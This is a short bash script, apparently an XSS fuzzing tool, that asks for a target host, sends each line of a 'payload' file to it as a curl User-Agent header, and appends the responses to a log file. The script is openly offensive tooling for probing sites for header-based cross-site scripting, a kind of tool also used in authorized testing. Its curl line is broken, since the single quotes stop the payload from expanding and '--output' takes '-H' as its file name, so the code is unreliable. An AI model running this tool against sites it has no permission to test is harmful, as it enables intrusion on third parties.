#!/bin/bash
echo -e "[-] Input Setting"
echo -ne "[+] Enter Host: "
read Host
echo -e "[-] Posting"

while read payload
do
content=$(curl -i -v --output -H 'User-Agent: "${payload}"' $Host)
 echo $payload
 echo $content >> http_useragent_payloadoutput.txt
done < payload
echo -e "";
echo -e "[-] HTTP USER AGENT XSS Finished       "
echo -e "";